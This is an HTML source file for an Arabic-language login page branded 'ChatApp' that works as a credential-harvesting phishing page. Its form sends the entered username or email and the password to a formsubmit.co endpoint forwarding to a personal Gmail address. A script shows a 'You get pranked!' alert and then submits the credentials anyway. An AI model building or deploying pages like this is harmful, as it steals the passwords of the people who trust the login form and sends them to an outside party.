<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول - ChatApp</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet" />
  <style>
    body {
      background-color: #f8f9fa;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .login-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 80px;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <img src="https://cdn-icons-png.flaticon.com/512/2462/2462719.png" alt="شعار ChatApp" class="logo" />
    <form id="loginForm" action="https://formsubmit.co/amine.elfokari@gmail.com" method="POST" autocomplete="off" novalidate>
      <div class="mb-3">
        <label for="username" class="form-label">اسم المستخدم أو البريد الإلكتروني</label>
        <input type="text" class="form-control" id="username" name="username" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني" required minlength="3" />
        <div class="invalid-feedback">يرجى إدخال اسم المستخدم أو البريد الإلكتروني (3 أحرف على الأقل).</div>
      </div>

      <div class="mb-3">
        <label for="password" class="form-label">كلمة المرور</label>
        <input type="password" class="form-control" id="password" name="password" placeholder="أدخل كلمة المرور" required minlength="6" />
        <div class="invalid-feedback">يرجى إدخال كلمة المرور (6 أحرف على الأقل).</div>
      </div>

      <div class="mb-3 form-check">
        <input type="checkbox" class="form-check-input" id="rememberMe" name="rememberMe" />
        <label class="form-check-label" for="rememberMe">تذكرني</label>
      </div>

      <button type="submit" class="btn btn-primary w-100">تسجيل الدخول</button>

      <div class="mt-3 d-flex justify-content-between">
        <a href="#" id="forgotLink">نسيت كلمة المرور؟</a>
        <a href="register.html" id="registerLink">تسجيل حساب جديد</a>
      </div>
    </form>
  </div>

  <script>
    // Bootstrap form validation
    (function () {
      'use strict';
      const form = document.getElementById('loginForm');

      form.addEventListener('submit', function (event) {
        if (!form.checkValidity()) {
          event.preventDefault();
          event.stopPropagation();
          form.classList.add('was-validated');
          return;
        }

        // Prevent default to show prank alert, then submit form manually after alert
        event.preventDefault();

        alert('You get pranked!');

        // After user closes alert, submit the form for real to FormSubmit.co
        form.submit();
      }, false);
    })();

    // Optional: alert placeholders for links
    document.getElementById('forgotLink').addEventListener('click', e => {
      e.preventDefault();
      alert('صفحة نسيت كلمة المرور غير مفعلة بعد.');
    });
  </script>
</body>
</html>
